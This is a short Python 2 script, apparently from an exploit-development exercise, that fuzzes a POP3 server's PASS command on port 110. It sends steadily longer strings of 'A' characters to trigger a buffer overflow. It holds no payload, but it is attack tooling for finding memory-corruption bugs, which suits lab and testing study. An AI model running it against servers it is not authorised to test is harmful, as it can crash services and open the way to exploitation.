#!/usr/bin/python
import socket

buffer=["A"]
contador=100
while len(buffer) <= 30:
	buffer.append("A"*contador)
	contador=contador+200

for string in buffer:
	print "Fuzzing em PASS com %s bytes" %len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("host",110))
	s.recv(1024)
	s.send('USER usuario\r\n')
	s.recv(1024)
	s.send('PASS '+string+'\r\n')
	s.send('QUIT\r\n')
